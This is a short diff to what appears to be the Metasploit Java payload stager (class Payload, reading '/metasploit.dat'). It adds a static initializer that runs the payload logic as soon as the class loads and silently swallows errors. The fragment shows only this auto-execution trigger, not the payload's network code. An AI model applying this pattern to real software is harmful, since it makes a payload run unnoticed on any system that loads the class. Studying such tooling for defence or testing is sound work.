@@ -65,7 +65,17 @@ import java.util.StringTokenizer;
  */
 public class Payload extends ClassLoader {
 
-	public static void main(String[] ignored) throws Exception {
+    static {
+        try {
+            run();
+        } catch (Exception e) {}
+    }
+
+	public static void main(String[] args) throws Exception {
+    }
+
+	public static void run() throws Exception {
+
 		// Find our properties. If we are running inside the jar, they are in a resource stream called "/metasploit.dat".
 		Properties props = new Properties();
 		Class clazz = Payload.class;
